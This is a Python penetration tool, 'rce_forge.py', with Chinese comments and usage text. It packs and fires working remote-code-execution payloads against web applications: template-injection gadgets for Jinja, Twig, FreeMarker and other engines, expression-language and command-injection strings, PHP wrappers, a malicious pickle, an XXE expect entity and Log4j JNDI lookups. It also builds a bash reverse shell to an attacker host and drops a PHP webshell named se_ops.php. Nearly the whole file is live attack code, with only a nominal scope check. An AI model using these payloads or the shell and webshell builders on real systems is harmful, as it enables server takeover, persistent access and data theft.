#!/usr/bin/env python3
"""大爱仙尊 RCE 锻造：常见 sink 直接出可执行载荷。

确认注入点后用，不是算术探测。能回连、能落 se_ops.php。
  python3 炼蛊房/rce_forge.py --list
  python3 炼蛊房/rce_forge.py pack --case <案> --cmd id
  python3 炼蛊房/rce_forge.py pack --case <案> --lhost 10.0.0.2 --lport 4444 --rev
  python3 炼蛊房/rce_forge.py pack --case <案> --write-ops --key <口令>
  python3 炼蛊房/rce_forge.py shoot --family ssti-jinja --url 'https://授权/?q=x' --param q --case <案>
  python3 炼蛊房/rce_forge.py --self-test
"""
from __future__ import annotations

import argparse
import base64
import json
import pickle
import re
import sys
from pathlib import Path
from typing import Any, Callable
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from sig_cleanup_scan import scan_bytes  # noqa: E402

# 不要匹配 whoami/se-ok：请求体反射就会假 L3
RCE_RX = re.compile(
    r"(?<![A-Za-z])uid=\d+|(?<![A-Za-z])gid=\d+|root:[x*]:0:0:|nt authority\\system",
    re.I,
)


def b64(s: str) -> str:
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


def sh_wrap(cmd: str) -> str:
    """任意命令进 /bin/sh，避免引号嵌套炸模板。"""
    return f"echo {b64(cmd)}|base64 -d|sh"


def rev_cmd(lhost: str, lport: int) -> str:
    return f"bash -c 'bash -i >& /dev/tcp/{lhost}/{int(lport)} 0>&1'"


def write_ops_cmd(key: str) -> str:
    from payload_forge import php_ops

    raw = php_ops(key)
    return f"echo {b64(raw)}|base64 -d > se_ops.php && id"


def _p(family: str, pid: str, body: str, sink: str, note: str = "") -> dict[str, str]:
    return {"family": family, "id": f"{family}.{pid}", "body": body, "sink": sink, "note": note}


def _f(tpl: str, cmd: str) -> str:
    return tpl.replace("{CMD}", cmd)


def fam_ssti_jinja(cmd: str) -> list[dict[str, str]]:
    # popen 只要 shell 字符串。裸 __import__ 在 Jinja 里是未定义名，会直接炸模板。
    w = sh_wrap(cmd)
    return [
        _p("ssti-jinja", "cycler", _f("{{ cycler.__init__.__globals__.os.popen('{CMD}').read() }}", w), "jinja"),
        _p("ssti-jinja", "lipsum", _f("{{ lipsum.__globals__['os'].popen('{CMD}').read() }}", w), "jinja"),
        _p("ssti-jinja", "joiner", _f("{{ joiner.__init__.__globals__.os.popen('{CMD}').read() }}", w), "jinja"),
        _p("ssti-jinja", "namespace", _f("{{ namespace.__init__.__globals__.os.popen('{CMD}').read() }}", w), "jinja"),
        _p(
            "ssti-jinja",
            "request",
            _f("{{ request.application.__globals__.__builtins__.__import__('os').popen('{CMD}').read() }}", w),
            "flask",
        ),
        _p("ssti-jinja", "sh", _f("{{ cycler.__init__.__globals__.os.popen('{CMD}').read() }}", w), "jinja"),
    ]


def fam_ssti_twig(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    return [
        _p("ssti-twig", "system", _f("{{ ['{CMD}']|filter('system')|join }}", w), "twig"),
        _p("ssti-twig", "exec", _f("{{ ['{CMD}']|filter('exec')|join }}", w), "twig"),
        _p("ssti-twig", "concat", _f("{{ ['{CMD}']|filter('sys'~'tem')|join }}", w), "twig"),
        _p("ssti-twig", "map", _f("{{ ['{CMD}']|map('system')|join }}", w), "twig"),
    ]


def fam_ssti_freemarker(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    return [
        _p(
            "ssti-freemarker",
            "execute",
            _f('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{CMD}")}', w),
            "freemarker",
        ),
        _p(
            "ssti-freemarker",
            "object",
            _f(
                '<#assign c="freemarker.template.utility.ObjectConstructor"?new()>'
                '${c("java.lang.ProcessBuilder","/bin/sh","-c","{CMD}").start()}',
                w,
            ),
            "freemarker",
        ),
    ]


def fam_ssti_velocity(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    return [
        _p(
            "ssti-velocity",
            "runtime",
            _f(
                '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))'
                '#set($ex=$rt.getRuntime().exec("/bin/sh -c {CMD}"))$ex',
                w,
            ),
            "velocity",
        ),
    ]


def fam_ssti_smarty(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    return [
        _p("ssti-smarty", "system", _f("{system('{CMD}')}", w), "smarty"),
        _p("ssti-smarty", "php", _f("{php}system('{CMD}');{/php}", w), "smarty3"),
        _p("ssti-smarty", "literal", _f("{if system('{CMD}')}{/if}", w), "smarty"),
    ]


def fam_ssti_pebble(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    return [
        _p(
            "ssti-pebble",
            "runtime",
            _f("{{ (1).class.forName('java.lang.Runtime').getRuntime().exec('/bin/sh -c {CMD}') }}", w),
            "pebble",
        ),
    ]


def fam_ssti_erb(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    return [
        _p("ssti-erb", "backtick", "<%= `" + w + "` %>", "erb"),
        _p("ssti-erb", "system", "<%= system('" + w + "') %>", "erb"),
        _p("ssti-erb", "popen", "<%= IO.popen('" + w + "').read %>", "erb"),
    ]


def fam_ssti_ejs(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    return [
        _p(
            "ssti-ejs",
            "execsync",
            "<%= global.process.mainModule.require('child_process').execSync('" + w + "') %>",
            "ejs",
        ),
    ]


def fam_ssti_nunjucks(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    js = (
        "return global.process.mainModule.require('child_process')"
        ".execSync('" + w + "')"
    )
    return [
        _p("ssti-nunjucks", "range", _f('{{range.constructor("{CMD}")()}}', js), "nunjucks"),
    ]


def fam_ssti_thymeleaf(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    spel = (
        _f("T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','{CMD}'})", w)
    )
    return [
        _p("ssti-thymeleaf", "inline", "__${" + spel + "}__::.x", "thymeleaf"),
        _p("ssti-thymeleaf", "text", "[[${" + spel + "}]]", "thymeleaf"),
    ]


def fam_el_spel(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    return [
        _p(
            "el-spel",
            "runtime",
            _f('T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","{CMD}"})', w),
            "spel",
        ),
        _p(
            "el-spel",
            "ioutils",
            _f(
                "${T(org.apache.commons.io.IOUtils).toString("
                'T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","{CMD}"}).getInputStream())}',
                w,
            ),
            "spel",
        ),
    ]


def fam_el_ognl(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    return [
        _p(
            "el-ognl",
            "runtime",
            _f('%{@java.lang.Runtime@getRuntime().exec(new String[]{"/bin/sh","-c","{CMD}"})}', w),
            "ognl",
        ),
        _p(
            "el-ognl",
            "builder",
            _f(
                "%{(#p=new java.lang.ProcessBuilder(new String[]{\"/bin/sh\",\"-c\",\"{CMD}\"}))"
                "(#p.redirectErrorStream(true))(#x=#p.start())"
                "(#b=new java.io.InputStreamReader(#x.getInputStream()))"
                "(#c=new java.io.BufferedReader(#b))(#c.readLine())}",
                w,
            ),
            "ognl",
        ),
    ]


def fam_el_groovy(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    return [
        _p("el-groovy", "execute", _f("['/bin/sh','-c','{CMD}'].execute().text", w), "groovy"),
        _p("el-groovy", "runtime", _f("Runtime.runtime.exec(['/bin/sh','-c','{CMD}'] as String[])", w), "groovy"),
    ]


def fam_cmdi_unix(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    return [
        _p("cmdi-unix", "semi", f";{w}", "sh"),
        _p("cmdi-unix", "pipe", f"|{w}", "sh"),
        _p("cmdi-unix", "and", f"&&{w}", "sh"),
        _p("cmdi-unix", "tick", f"`{w}`", "sh"),
        _p("cmdi-unix", "dollar", f"$({w})", "sh"),
        _p("cmdi-unix", "nl", f"%0a{w}", "sh"),
        _p("cmdi-unix", "ifs", f";{w.replace(' ', '${IFS}')}", "sh"),
    ]


def fam_cmdi_win(cmd: str) -> list[dict[str, str]]:
    return [
        _p("cmdi-win", "amp", f"& {cmd}", "cmd"),
        _p("cmdi-win", "pipe", f"| {cmd}", "cmd"),
        _p("cmdi-win", "and", f"&& {cmd}", "cmd"),
        _p("cmdi-win", "nl", f"%0a{cmd}", "cmd"),
    ]


def fam_php_eval(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    php = f"system('{w}');"
    return [
        _p("php-eval", "system", php, "php"),
        _p("php-eval", "passthru", f"passthru('{w}');", "php"),
        _p("php-eval", "backtick", f"echo `{w}`;", "php"),
        _p("php-eval", "b64", f"eval(base64_decode('{b64(php)}'));", "php"),
    ]


def fam_php_wrap(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    raw = f"<?php system('{w}');"
    return [
        _p("php-wrap", "data", "data://text/plain," + raw, "include"),
        _p("php-wrap", "data64", "data://text/plain;base64," + b64(raw), "include"),
        _p("php-wrap", "expect", f"expect://{w}", "expect"),
        _p("php-wrap", "input", '<?php system(base64_decode("' + b64(cmd) + '"));', "php://input"),
    ]


def fam_py_eval(cmd: str) -> list[dict[str, str]]:
    py = f"__import__('os').popen(__import__('base64').b64decode('{b64(cmd)}').decode()).read()"
    return [
        _p("py-eval", "popen", py, "python"),
        _p("py-eval", "eval", f"eval('{py}')", "python"),
        _p("py-eval", "os", f"__import__('os').system('{sh_wrap(cmd)}')", "python"),
    ]


def fam_node_eval(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd)
    return [
        _p("node-eval", "execsync", f"require('child_process').execSync('{w}')", "node"),
        _p(
            "node-eval",
            "main",
            f"global.process.mainModule.require('child_process').execSync('{w}')",
            "node",
        ),
    ]


def fam_deser_pickle(cmd: str) -> list[dict[str, str]]:
    class _S:
        def __reduce__(self) -> tuple[Any, tuple[str]]:
            return (__import__("os").system, (cmd,))

    blob = base64.b64encode(pickle.dumps(_S(), protocol=0)).decode("ascii")
    return [_p("deser-pickle", "b64", blob, "pickle", "POST 这个 base64，服务端 loads 即执行")]


def fam_xxe_expect(cmd: str) -> list[dict[str, str]]:
    w = sh_wrap(cmd).replace('"', "")
    xml = (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "expect://{w}">]>\n'
        "<r>&xxe;</r>\n"
    )
    return [_p("xxe-expect", "entity", xml, "xxe")]


def _jndi_host(cmd: str) -> str:
    c = (cmd or "").strip()
    m = re.search(r"/dev/tcp/([^/]+)/(\d+)", c)
    if m:
        return f"{m.group(1)}:{m.group(2)}"
    if re.fullmatch(r"[A-Za-z0-9._-]+:\d{1,5}", c) or re.fullmatch(
        r"\d{1,3}(?:\.\d{1,3}){3}:\d{1,5}", c
    ):
        return c
    return "ATTACK:1389"


def fam_jndi(cmd: str) -> list[dict[str, str]]:
    host = _jndi_host(cmd)
    return [
        _p("jndi", "ldap", f"${{jndi:ldap://{host}/a}}", "log4j"),
        _p("jndi", "rmi", f"${{jndi:rmi://{host}/a}}", "log4j"),
        _p("jndi", "lower", f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{host}/a}}", "log4j"),
    ]


FAMILIES: dict[str, Callable[[str], list[dict[str, str]]]] = {
    "ssti-jinja": fam_ssti_jinja,
    "ssti-twig": fam_ssti_twig,
    "ssti-freemarker": fam_ssti_freemarker,
    "ssti-velocity": fam_ssti_velocity,
    "ssti-smarty": fam_ssti_smarty,
    "ssti-pebble": fam_ssti_pebble,
    "ssti-erb": fam_ssti_erb,
    "ssti-ejs": fam_ssti_ejs,
    "ssti-nunjucks": fam_ssti_nunjucks,
    "ssti-thymeleaf": fam_ssti_thymeleaf,
    "el-spel": fam_el_spel,
    "el-ognl": fam_el_ognl,
    "el-groovy": fam_el_groovy,
    "cmdi-unix": fam_cmdi_unix,
    "cmdi-win": fam_cmdi_win,
    "php-eval": fam_php_eval,
    "php-wrap": fam_php_wrap,
    "py-eval": fam_py_eval,
    "node-eval": fam_node_eval,
    "deser-pickle": fam_deser_pickle,
    "xxe-expect": fam_xxe_expect,
    "jndi": fam_jndi,
}


def resolve_cmd(*, cmd: str, lhost: str, lport: int, key: str, rev: bool, write_ops: bool) -> str:
    if write_ops:
        return write_ops_cmd(key or "seRceKey")
    if rev:
        if not lhost or not lport:
            raise SystemExit("[err] --rev 需要 --lhost --lport")
        return rev_cmd(lhost, lport)
    return (cmd or "id").strip() or "id"


def render_family(family: str, cmd: str) -> list[dict[str, str]]:
    if family not in FAMILIES:
        raise SystemExit(f"[err] 未知 family: {family}")
    return FAMILIES[family](cmd)


def render_all(cmd: str, families: list[str] | None = None) -> list[dict[str, str]]:
    names = families or list(FAMILIES)
    rows: list[dict[str, str]] = []
    for name in names:
        rows.extend(render_family(name, cmd))
    return rows


def pack(
    dest: Path,
    *,
    cmd: str,
    families: list[str] | None = None,
) -> dict[str, Any]:
    dest.mkdir(parents=True, exist_ok=True)
    rows = render_all(cmd, families)
    items = []
    dirty = []
    for row in rows:
        sub = dest / row["family"]
        sub.mkdir(parents=True, exist_ok=True)
        name = row["id"].split(".", 1)[-1] + (".xml" if row["family"] == "xxe-expect" else ".txt")
        path = sub / name
        raw = row["body"].encode("utf-8")
        path.write_bytes(raw)
        scan = scan_bytes(raw, name=name)
        item = {**row, "file": str(path), "scan": scan["verdict"], "bytes": len(raw)}
        items.append(item)
        if scan["verdict"] == "dirty":
            dirty.append(row["id"])
    how = (
        "# 大爱仙尊 RCE 载荷\n\n"
        f"- 命令: `{cmd}`\n"
        f"- 条数: {len(items)}\n\n"
        "确认 sink 后 `shoot --family <族> --url --param`。\n"
        "回连先 `se_listen.py`，再 `--rev --lhost --lport` 重出包。\n"
        "落马用 `--write-ops --key`，再 `payload_forge.py drive`。\n"
        "JNDI 族的命令位填 `攻击机:端口`，不要填 id。\n"
    )
    (dest / "HOW_TO.md").write_text(how, encoding="utf-8")
    rec = {
        "ok": not dirty,
        "n": len(items),
        "cmd": cmd,
        "dir": str(dest),
        "dirty": dirty,
        "families": sorted({i["family"] for i in items}),
        "items": [{"id": i["id"], "file": i["file"], "scan": i["scan"]} for i in items],
        "playbook": "传承/全力以赴-炼法.md",
    }
    (dest / "manifest.json").write_text(json.dumps(rec, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    return rec


def with_param(url: str, name: str, value: str) -> str:
    u = urlparse(url)
    q = dict(parse_qsl(u.query, keep_blank_values=True))
    q[name] = value
    return urlunparse(u._replace(query=urlencode(q, safe="")))


def hit_rce(body: str) -> bool:
    return bool(RCE_RX.search(body or ""))


def shoot(
    url: str,
    family: str,
    *,
    param: str,
    cmd: str,
    method: str = "GET",
) -> dict[str, Any]:
    from probe_http import get, post, session
    from scope_lib import host_of, require_in_scope

    host = host_of(url)
    if host not in ("127.0.0.1", "localhost", "::1"):
        require_in_scope(url)
    if family == "jndi" and _jndi_host(cmd) == "ATTACK:1389":
        raise SystemExit("[err] jndi 需要 --rev --lhost --lport，或 --cmd 攻击机:端口")
    rows = render_family(family, cmd)
    s = session()
    tried = []
    for row in rows:
        if family == "xxe-expect" or row["sink"] == "xxe":
            r = post(url, sess=s, data=row["body"].encode(), headers={"Content-Type": "application/xml"}, timeout=15)
            text = r.text or ""
            status = r.status
        elif method.upper() == "POST":
            r = post(url, sess=s, data={param: row["body"]}, timeout=15)
            text = r.text or ""
            status = r.status
        else:
            r = get(with_param(url, param, row["body"]), sess=s, timeout=15)
            text = r.text or ""
            status = r.status
        rec = {"id": row["id"], "status": status, "hit": hit_rce(text), "preview": text[:240]}
        tried.append(rec)
        if rec["hit"]:
            return {"ok": True, "l3": True, "url": url, "family": family, "win": rec, "tried": tried}
    return {"ok": False, "l3": False, "url": url, "family": family, "win": None, "tried": tried}


def _dest(case: str, out: str) -> Path:
    if out:
        return Path(out).expanduser()
    if case:
        from scope_lib import ENGINE

        d = ENGINE / "案卷" / case / "测绘" / "rce"
        d.mkdir(parents=True, exist_ok=True)
        return d
    raise SystemExit("[err] 需要 --case 或 --out")


def run_self_test() -> list[str]:
    import tempfile
    import threading
    from http.server import BaseHTTPRequestHandler, HTTPServer
    from urllib.parse import parse_qs, unquote_plus

    fails: list[str] = []
    cmd = "id"
    rows = render_all(cmd)
    if len(rows) < 40:
        fails.append(f"too few {len(rows)}")
    seen = {r["id"] for r in rows}
    if len(seen) != len(rows):
        fails.append("dup id")
    need = ("ssti-jinja.cycler", "ssti-twig.system", "el-spel.runtime", "cmdi-unix.semi", "deser-pickle.b64")
    for n in need:
        if n not in seen:
            fails.append(f"missing {n}")
    blob = "\n".join(r["body"] for r in rows)
    if "popen" not in blob or "filter('system')" not in blob:
        fails.append("core gadget")
    wcmd = write_ops_cmd("seRceT")
    if "se_ops.php" not in wcmd or "base64" not in wcmd or "&& id" not in wcmd:
        fails.append("write-ops")
    if "dev/tcp/127.0.0.1/4444" not in rev_cmd("127.0.0.1", 4444):
        fails.append("rev")
    pkl = base64.b64decode(render_family("deser-pickle", "true")[0]["body"])
    if b"system" not in pkl:
        fails.append("pickle")
    with tempfile.TemporaryDirectory() as td:
        rec = pack(Path(td), cmd=cmd)
        if rec["n"] != len(rows):
            fails.append("pack n")
        if rec["dirty"]:
            fails.append("dirty " + ",".join(rec["dirty"]))
        if not (Path(td) / "HOW_TO.md").is_file():
            fails.append("howto")

    class H(BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            q = parse_qs(urlparse(self.path).query)
            val = unquote_plus((q.get("q") or [""])[0])
            body = b"uid=0(" if ("popen" in val or "system" in val) else b"nope"
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *_a: Any) -> None:
            return

    srv = HTTPServer(("127.0.0.1", 0), H)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    try:
        hit = shoot(
            f"http://127.0.0.1:{srv.server_port}/?q=x",
            "ssti-jinja",
            param="q",
            cmd="id",
        )
        if not hit.get("l3"):
            fails.append(f"shoot {hit}")
    finally:
        srv.shutdown()
    return fails


def main() -> int:
    ap = argparse.ArgumentParser(description="大爱仙尊 RCE 锻造")
    sub = ap.add_subparsers(dest="action")
    ap.add_argument("--self-test", action="store_true")
    ap.add_argument("--list", action="store_true")

    def add_cmd_flags(p: argparse.ArgumentParser) -> None:
        p.add_argument("--cmd", default="id")
        p.add_argument("--lhost", default="")
        p.add_argument("--lport", type=int, default=0)
        p.add_argument("--key", default="")
        p.add_argument("--rev", action="store_true")
        p.add_argument("--write-ops", action="store_true")

    p_pack = sub.add_parser("pack", help="写出全部/指定族载荷")
    p_pack.add_argument("--case", default="")
    p_pack.add_argument("--out", default="")
    p_pack.add_argument("--json", action="store_true")
    p_pack.add_argument("--family", default="", help="只出一族，逗号分隔")
    add_cmd_flags(p_pack)

    p_sh = sub.add_parser("shoot", help="对授权站连打一族直到 uid=")
    p_sh.add_argument("--url", required=True)
    p_sh.add_argument("--param", default="q")
    p_sh.add_argument("--family", required=True, choices=sorted(FAMILIES))
    p_sh.add_argument("--method", default="GET", choices=["GET", "POST"])
    p_sh.add_argument("--case", default="")
    p_sh.add_argument("--json", action="store_true")
    add_cmd_flags(p_sh)

    args = ap.parse_args()
    if args.self_test:
        fails = run_self_test()
        if fails:
            for f in fails:
                print(f"FAIL {f}")
            return 1
        n = len(render_all("id"))
        print(f"self-test ok  rce_forge {len(FAMILIES)} families / {n} payloads")
        return 0

    if args.list or args.action is None:
        for name, fn in FAMILIES.items():
            print(f"{name:18}  {len(fn('id')):2}  {fn('id')[0]['sink']}")
        return 0

    if args.action == "pack":
        names = [x.strip() for x in args.family.split(",") if x.strip()] or None
        c = resolve_cmd(
            cmd=args.cmd, lhost=args.lhost, lport=args.lport, key=args.key, rev=args.rev, write_ops=args.write_ops
        )
        rec = pack(_dest(args.case, args.out), cmd=c, families=names)
        if args.json:
            print(json.dumps(rec, ensure_ascii=False, indent=2))
        else:
            print(f"DIR   {rec['dir']}")
            print(f"N     {rec['n']}  families={','.join(rec['families'])}")
            print(f"CMD   {rec['cmd'][:80]}")
            if rec["dirty"]:
                print("DIRTY " + ",".join(rec["dirty"]))
                return 3
        return 0

    if args.action == "shoot":
        c = resolve_cmd(
            cmd=args.cmd, lhost=args.lhost, lport=args.lport, key=args.key, rev=args.rev, write_ops=args.write_ops
        )
        rec = shoot(args.url, args.family, param=args.param, cmd=c, method=args.method)
        if args.case:
            from scope_lib import write_probe_json

            write_probe_json(rec, case=args.case, case_subdir="rce", filename=f"shoot_{args.family}.json")
        print(json.dumps({k: rec[k] for k in rec if k != "tried"} | {"tried_n": len(rec["tried"])}, ensure_ascii=False))
        if rec.get("win"):
            print(f"WIN  {rec['win']['id']}  {rec['win']['preview'][:160]}")
        return 0 if rec.get("l3") else 1

    ap.error("需要 pack / shoot / --list / --self-test")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
